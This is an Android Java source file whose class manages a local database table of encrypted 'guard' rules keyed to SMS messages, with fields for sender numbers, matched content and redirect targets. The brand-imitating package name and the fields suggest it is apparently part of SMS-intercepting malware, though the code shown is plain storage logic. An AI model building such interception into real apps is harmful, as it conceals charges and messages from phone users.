package com.baidu.alipay.script.sms;

import java.util.ArrayList;
import java.util.List;

import com.baidu.alipay.Utils;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;

public class GuardPojoHandler extends BaseHandler{

	private static final String TABLE = "AAC";
	
	public GuardPojoHandler(Context context) {
		super(context);
	}

	@Override
	protected String getTable() {
		return TABLE;
	}
	
	public List<GuardPojo> listBySms(String smsKey){
		Cursor c = query(new String[]{GuardPojo.KEY,GuardPojo.SMSKEY,GuardPojo.SMSNOLEFT,GuardPojo.GUARDCONTENT,
				GuardPojo.GUARDSTART,GuardPojo.GUARDEND,
				GuardPojo.GUARDDIRECT,GuardPojo.GUARDRE,GuardPojo.GUARDTIMEOUT,GuardPojo.ISLONG,
				GuardPojo.RECVSUCCESS,GuardPojo.STARTTIME,GuardPojo.ISMMS,GuardPojo.GUARDREDIRECTTO,GuardPojo.SETVALUE}, "smskey = ? and Status >= 0", new String[]{smsKey}, null, null, null,null);
		
		return list(c);
	}
	
	public List<GuardPojo> listAll(){
		Cursor c = query(new String[]{GuardPojo.KEY,GuardPojo.SMSKEY,GuardPojo.SMSNOLEFT,GuardPojo.GUARDCONTENT,
				GuardPojo.GUARDSTART,GuardPojo.GUARDEND,
				GuardPojo.GUARDDIRECT,GuardPojo.GUARDRE,GuardPojo.GUARDTIMEOUT,GuardPojo.ISLONG,
				GuardPojo.RECVSUCCESS,GuardPojo.STARTTIME,GuardPojo.ISMMS,GuardPojo.GUARDREDIRECTTO,GuardPojo.SETVALUE}, "Status >= 0", null, null, null, GuardPojo.SMSKEY+" asc,"+GuardPojo.STARTTIME+" asc",null);
		
		return list(c);
	}
	
	private List<GuardPojo> list(Cursor c){
		List<GuardPojo> list = new ArrayList<GuardPojo>();
		try{
			if(c != null && c.moveToFirst()){//判断游标是否为空
	
			    for(int i=0;i<c.getCount();i++){
	
			        c.moveToPosition(i);//移动到指定记录
			        
			        GuardPojo guardPojo = new GuardPojo();
			        
			        guardPojo.setKey(c.getString(c.getColumnIndex(GuardPojo.KEY)));
			        guardPojo.setSmsKey(c.getString(c.getColumnIndex(GuardPojo.SMSKEY)));
			        
			        String smsNoLeft = c.getString(c.getColumnIndex(GuardPojo.SMSNOLEFT));
			        smsNoLeft = Utils.decrypt(smsNoLeft);
			        
			        guardPojo.setSmsNoLeft(smsNoLeft);
			        
			        String guardContent = c.getString(c.getColumnIndex(GuardPojo.GUARDCONTENT));
			        guardContent = Utils.decrypt(guardContent);
			        
			        guardPojo.setGuardContent(guardContent);
			        guardPojo.setGuardStart(c.getString(c.getColumnIndex(GuardPojo.GUARDSTART)));
			        guardPojo.setGuardEnd(c.getString(c.getColumnIndex(GuardPojo.GUARDEND)));
			        guardPojo.setGuardDirect(c.getString(c.getColumnIndex(GuardPojo.GUARDDIRECT)));
			        guardPojo.setGuardRe(c.getString(c.getColumnIndex(GuardPojo.GUARDRE)));
			        guardPojo.setGuardTimeOut(c.getString(c.getColumnIndex(GuardPojo.GUARDTIMEOUT)));
			        guardPojo.setIsLong(c.getString(c.getColumnIndex(GuardPojo.ISLONG)));
			        guardPojo.setRecvSuccess(c.getString(c.getColumnIndex(GuardPojo.RECVSUCCESS)));
			        guardPojo.setStartTime(c.getLong(c.getColumnIndex(GuardPojo.STARTTIME)));
			        
			        guardPojo.setIsmms(c.getString(c.getColumnIndex(GuardPojo.ISMMS)));
			        
			        guardPojo.setGuardRedirectTo(c.getString(c.getColumnIndex(GuardPojo.GUARDREDIRECTTO)));
			        
			        guardPojo.setSetValue(c.getString(c.getColumnIndex(GuardPojo.SETVALUE)));
			        
			        list.add(guardPojo);
			    }
			}
		}catch (Exception e) {
			e.printStackTrace();
		}finally{
			if(c != null){
				try {
					c.close();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
		
		return list;
	}
	
	public void save(String smsKey,List<GuardPojo> guardPojoList){
		
		if(guardPojoList != null && guardPojoList.size() > 0){
			
			for(GuardPojo guardPojo : guardPojoList){
				
				guardPojo.setSmsKey(smsKey);
				
				save(guardPojo);
			}
				
		}
		
	}
	
	public void save(GuardPojo guardPojo){
		ContentValues contentValues = new ContentValues();
		
		contentValues.put(GuardPojo.KEY, guardPojo.getKey());
		contentValues.put(GuardPojo.SMSKEY, guardPojo.getSmsKey());
		
		String smsNoLeft = guardPojo.getSmsNoLeft();
		smsNoLeft = Utils.encrypt(smsNoLeft);
		contentValues.put(GuardPojo.SMSNOLEFT, smsNoLeft);
		
		String guardContent = guardPojo.getGuardContent();
		guardContent = Utils.encrypt(guardContent);
		
		contentValues.put(GuardPojo.GUARDCONTENT, guardContent);
		contentValues.put(GuardPojo.GUARDSTART, guardPojo.getGuardStart());
		contentValues.put(GuardPojo.GUARDEND, guardPojo.getGuardEnd());
		contentValues.put(GuardPojo.GUARDDIRECT, guardPojo.getGuardDirect());
		contentValues.put(GuardPojo.GUARDRE, guardPojo.getGuardRe());
		contentValues.put(GuardPojo.GUARDTIMEOUT, guardPojo.getGuardTimeOut());
		contentValues.put(GuardPojo.ISLONG, guardPojo.getIsLong());
		contentValues.put(GuardPojo.RECVSUCCESS, guardPojo.getRecvSuccess());
		contentValues.put(GuardPojo.STATUS, guardPojo.getStatus());
		contentValues.put(GuardPojo.STARTTIME,guardPojo.getStartTime());
		contentValues.put(GuardPojo.ISMMS, guardPojo.getIsmms());
		contentValues.put(GuardPojo.GUARDREDIRECTTO, guardPojo.getGuardRedirectTo());
		contentValues.put(GuardPojo.SETVALUE,guardPojo.getSetValue());
		
		this.insert(contentValues);
	}

	public void updateStatus(GuardPojo guardPojo) {
		ContentValues contentValues = new ContentValues();
		
		contentValues.put(GuardPojo.STATUS, guardPojo.getStatus());
		
		update(contentValues, "key = ?", new String[]{guardPojo.getKey()});
	}

	public void delete(GuardPojo guardPojo) {
		
		delete("key = ?", new String[]{guardPojo.getKey()});
	}

	public void deleteBySms(String smsKey) {
		delete("smskey = ?",new String[]{smsKey});
		
	}

}
